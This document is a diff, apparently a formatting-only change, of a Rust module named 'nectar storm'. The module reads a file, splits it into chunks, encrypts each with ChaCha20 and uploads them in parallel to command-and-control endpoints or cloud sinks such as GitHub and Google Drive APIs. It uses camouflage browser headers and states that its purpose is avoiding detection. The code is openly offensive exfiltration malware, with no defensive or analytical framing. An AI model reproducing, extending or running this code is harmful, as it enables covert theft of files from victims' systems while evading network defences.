@@ -3,15 +3,15 @@
 // and exfiltrate simultaneously to multiple C2 endpoints or cloud sinks.
 // Reduces exfiltration time drastically — critical for avoiding detection.
 
-use crate::crypto::{encrypt_chacha20, derive_key};
+use crate::crypto::{derive_key, encrypt_chacha20};
 use std::time::{Duration, Instant};
 use tracing::{info, warn};
 
 /// Configuration for a nectar storm exfiltration run.
 pub struct NectarStorm {
-    pub chunk_size: usize,          // bytes per chunk (default 64KB)
-    pub parallel_workers: usize,    // max concurrent uploads
-    pub c2_endpoints: Vec<String>,  // C2 URLs / cloud sinks
+    pub chunk_size: usize,             // bytes per chunk (default 64KB)
+    pub parallel_workers: usize,       // max concurrent uploads
+    pub c2_endpoints: Vec<String>,     // C2 URLs / cloud sinks
     pub encryption_seeds: Vec<String>, // distinct encryption seeds per worker
     pub timeout_secs: u64,
     pub camo_headers: Vec<(String, String)>, // mimicked HTTP headers
@@ -28,10 +28,15 @@ impl Default for NectarStorm {
                 "https://api.github.com/repos/org/repo".into(),
                 "https://www.googleapis.com/upload/drive".into(),
             ],
-            encryption_seeds: (1..=8).map(|i| format!("NECTAR_SEED_WORKER_{}", i)).collect(),
+            encryption_seeds: (1..=8)
+                .map(|i| format!("NECTAR_SEED_WORKER_{}", i))
+                .collect(),
             timeout_secs: 30,
             camo_headers: vec![
-                ("User-Agent".into(), "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0".into()),
+                (
+                    "User-Agent".into(),
+                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0".into(),
+                ),
                 ("Accept".into(), "application/json, text/plain".into()),
                 ("Content-Type".into(), "application/octet-stream".into()),
                 ("X-Requested-With".into(), "XMLHttpRequest".into()),
@@ -49,12 +54,8 @@ pub struct NectarChunk {
 }
 
 /// Split and encrypt a file for the nectar storm.
-pub fn prepare_storm(
-    file_path: &str,
-    storm: &NectarStorm,
-) -> Result<Vec<NectarChunk>, String> {
-    let data = std::fs::read(file_path)
-        .map_err(|e| format!("read {}: {}", file_path, e))?;
+pub fn prepare_storm(file_path: &str, storm: &NectarStorm) -> Result<Vec<NectarChunk>, String> {
+    let data = std::fs::read(file_path).map_err(|e| format!("read {}: {}", file_path, e))?;
 
     let chunks: Vec<_> = data.chunks(storm.chunk_size).collect();
     let total = chunks.len();
@@ -66,7 +67,7 @@ pub fn prepare_storm(
         let encrypted = encrypt_chacha20(chunk, &key);
 
         let mut checksum = [0u8; 32];
-        use sha2::{Sha256, Digest};
+        use sha2::{Digest, Sha256};
         let mut hasher = Sha256::new();
         hasher.update(&encrypted);
         checksum.copy_from_slice(&hasher.finalize());
@@ -79,16 +80,18 @@ pub fn prepare_storm(
         });
     }
 
-    info!("NECTAR: prepared {} chunks from {} ({} bytes)", total, file_path, data.len());
+    info!(
+        "NECTAR: prepared {} chunks from {} ({} bytes)",
+        total,
+        file_path,
+        data.len()
+    );
     Ok(nectar_chunks)
 }
 
 /// Execute a nectar storm: upload all chunks in parallel.
 /// Returns (chunks_uploaded, total_chunks, elapsed_ms).
-pub async fn execute_storm(
-    chunks: Vec<NectarChunk>,
-    storm: NectarStorm,
-) -> (usize, usize, u128) {
+pub async fn execute_storm(chunks: Vec<NectarChunk>, storm: NectarStorm) -> (usize, usize, u128) {
     let start = Instant::now();
     let total = chunks.len();
 
@@ -111,14 +114,18 @@ pub async fn execute_storm(
             for (k, v) in &headers {
                 req = req.header(k, v);
             }
-            req = req.header("X-Chunk-Index", idx.to_string())
-                   .body(data);
+            req = req.header("X-Chunk-Index", idx.to_string()).body(data);
 
             match req.send().await {
                 Ok(resp) => {
                     let ok = resp.status().is_success();
                     if !ok {
-                        warn!("NECTAR: chunk {} to {} returned {}", idx, endpoint, resp.status());
+                        warn!(
+                            "NECTAR: chunk {} to {} returned {}",
+                            idx,
+                            endpoint,
+                            resp.status()
+                        );
                     }
                     (idx, ok)
                 }
@@ -139,18 +146,21 @@ pub async fn execute_storm(
     }
 
     let elapsed = start.elapsed().as_millis();
-    let rate = if elapsed > 0 { (total * storm.chunk_size) as f64 / elapsed as f64 * 1000.0 / 1_048_576.0 } else { 0.0 };
+    let rate = if elapsed > 0 {
+        (total * storm.chunk_size) as f64 / elapsed as f64 * 1000.0 / 1_048_576.0
+    } else {
+        0.0
+    };
 
-    info!("NECTAR storm: {}/{} chunks in {}ms ({:.1} MB/s)",
-        uploaded, total, elapsed, rate);
+    info!(
+        "NECTAR storm: {}/{} chunks in {}ms ({:.1} MB/s)",
+        uploaded, total, elapsed, rate
+    );
     (uploaded, total, elapsed)
 }
 
 /// Reassemble nectar chunks into the original file.
-pub fn reassemble_storm(
-    chunks: &[NectarChunk],
-    storm: &NectarStorm,
-) -> Result<Vec<u8>, String> {
+pub fn reassemble_storm(chunks: &[NectarChunk], storm: &NectarStorm) -> Result<Vec<u8>, String> {
     let total = chunks.len();
     let mut data = vec![0u8; total * storm.chunk_size];
     let mut recovered = 0usize;
@@ -171,7 +181,12 @@ pub fn reassemble_storm(
         }
     }
 
-    info!("NECTAR: reassembled {}/{} chunks ({:.0} KB)", recovered, total, data.len() as f64 / 1024.0);
+    info!(
+        "NECTAR: reassembled {}/{} chunks ({:.0} KB)",
+        recovered,
+        total,
+        data.len() as f64 / 1024.0
+    );
     Ok(data)
 }
 
@@ -183,7 +198,10 @@ mod tests {
     fn test_prepare_small_file() {
         let tmp = "/tmp/nectar_test_small.dat";
         std::fs::write(tmp, b"Hello Nectar Storm!").unwrap();
-        let storm = NectarStorm { chunk_size: 8, ..Default::default() };
+        let storm = NectarStorm {
+            chunk_size: 8,
+            ..Default::default()
+        };
         let chunks = prepare_storm(tmp, &storm).unwrap();
         assert!(chunks.len() >= 2, "Should split into at least 2 chunks");
         std::fs::remove_file(tmp).ok();
@@ -194,7 +212,10 @@ mod tests {
         let tmp = "/tmp/nectar_test_rt.dat";
         let original = vec![0xAAu8; 4096];
         std::fs::write(tmp, &original).unwrap();
-        let storm = NectarStorm { chunk_size: 1024, ..Default::default() };
+        let storm = NectarStorm {
+            chunk_size: 1024,
+            ..Default::default()
+        };
         let chunks = prepare_storm(tmp, &storm).unwrap();
         let reassembled = reassemble_storm(&chunks, &storm).unwrap();
         assert_eq!(&reassembled[..original.len()], &original[..]);
@@ -205,8 +226,18 @@ mod tests {
     fn test_encryption_per_chunk() {
         let storm = NectarStorm::default();
         let chunks = vec![
-            NectarChunk { index: 0, data: vec![1u8; 64], checksum: [0;32], worker_id: 0 },
-            NectarChunk { index: 1, data: vec![2u8; 64], checksum: [0;32], worker_id: 1 },
+            NectarChunk {
+                index: 0,
+                data: vec![1u8; 64],
+                checksum: [0; 32],
+                worker_id: 0,
+            },
+            NectarChunk {
+                index: 1,
+                data: vec![2u8; 64],
+                checksum: [0; 32],
+                worker_id: 1,
+            },
         ];
         let reassembled = reassemble_storm(&chunks, &storm);
         assert!(reassembled.is_ok());
